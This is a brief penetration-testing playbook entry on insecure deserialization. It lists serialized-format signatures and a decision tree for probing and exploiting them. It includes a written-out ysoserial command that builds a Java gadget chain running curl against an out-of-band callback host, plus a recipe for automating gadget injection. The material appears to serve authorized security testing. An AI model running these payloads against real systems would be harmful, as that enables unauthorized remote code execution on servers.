## Insecure Deserialization

- **[Primary Probe]** Identify serialized formats in cookies, hidden fields, API bodies:
  - Java: `rO0AB` (base64 `\xAC\xED`)
  - PHP: `O:8:"stdClass":`
  - Python Pickle: `\x80\x02`
  - .NET: `AAEAAAD/////`
  - **[Signal: Format confirmed]** Generate gadget chains: `ysoserial.jar CommonsCollections6 "curl https://interactsh"` (Java), `ysoserial` (Python), `PHPGGC` (PHP)
  - **[Dead End: Signature-verified]** Look for secondary deserialization: objects stored server-side and retrieved via controllable key
  - **[Dead End: No known gadget chains]** Fuzzing: corrupt serialized bytes; different exception classes = different gadget candidates
  - **[Dead End: Black-box]** OOB via DNS lookup gadget; monitor interactsh for callback confirming execution path

**Java Gadget Automation:**
- Decode base64 token, detect magic bytes `0xACED`
- Iterate `ysoserial` gadgets: `CommonsCollections1–7`, `Spring1`, `Groovy1`
- Generate payload with OOB callback command for each
- Re-encode, inject, monitor interactsh for DNS callback

***
